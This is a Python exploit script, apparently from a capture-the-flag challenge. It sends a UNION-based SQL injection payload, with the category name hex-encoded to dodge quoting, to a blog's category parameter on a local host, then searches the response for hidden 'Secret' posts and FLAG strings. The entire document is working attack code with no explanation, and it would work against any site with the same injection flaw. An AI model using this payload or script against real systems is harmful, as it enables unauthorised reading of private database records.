> import requests
import urllib.parse
import re

# Target URL
base_url = "http://127.0.0.1:33130/"
endpoint = "?category="

# Craft the SQL injection payload
# NoExist category doesn't exist, then UNION with Secret category
# Structure: [malicious SQL injection with hex encoding]

payload = "NoExist' UNION SELECT id,title,excerpt,content,category,author,created_at FROM posts WHERE category=0x536563726574--"

# URL encode the payload
url_encoded_payload = urllib.parse.quote(payload, safe='')

# Construct full URL
full_url = f"{base_url}{endpoint}{url_encoded_payload}"

print(f"[+] Target URL: {base_url}")
print(f"[+] Full request URL: {full_url}")
print(f"[+] Payload: {payload}")
print(f"[+] URL encoded payload: {url_encoded_payload}")
print("=" * 80)

try:
    # Make the request
    response = requests.get(full_url, timeout=10)
    
    print(f"[+] Response Status Code: {response.status_code}")
    print(f"[+] Response Headers: {dict(response.headers)}")
    print(f"[+] Response Content Length: {len(response.text)} bytes")
    print("\n[+] Full Response Content:")
    print("=" * 80)
    print(response.text)
    print("=" * 80)
    
    # Search for posts in the response
    print("\n[+] Searching for posts from Secret category...")
    
    # Look for common patterns that might indicate posts
    if "Secret" in response.text:
        print("[✓] Found 'Secret' in response!")
        
    # Look for flag pattern
    flag_pattern = r'FLAG\{[^}]+\}'
    flags = re.findall(flag_pattern, response.text)
    
    if flags:
        print(f"\n[!] FLAG(S) FOUND: {flags}")
        for flag in flags:
            print(f"    - {flag}")
    else:
        print("\n[-] No FLAG pattern found in response")
        
    # Extract and display post information if in a list format
    lines = response.text.split('\n')
    secret_posts = []
    
    for i, line in enumerate(lines):
        if "Secret" in line:
            # Extract surrounding context
            start = max(0, i-2)
            end = min(len(lines), i+3)
            context = '\n'.join(lines[start:end])
            secret_posts.append(context)
    
    if secret_posts:
        print(f"\n[+] Found {len(secret_posts)} sections containing 'Secret':")
        for idx, post in enumerate(secret_posts, 1):
            print(f"\n--- Secret Post Section {idx} ---")
            print(post)
    else:
        print("\n[-] No specific Secret posts sections identified")
        
except Exception as e:
    print(f"\n[!] Error making request: {e}")
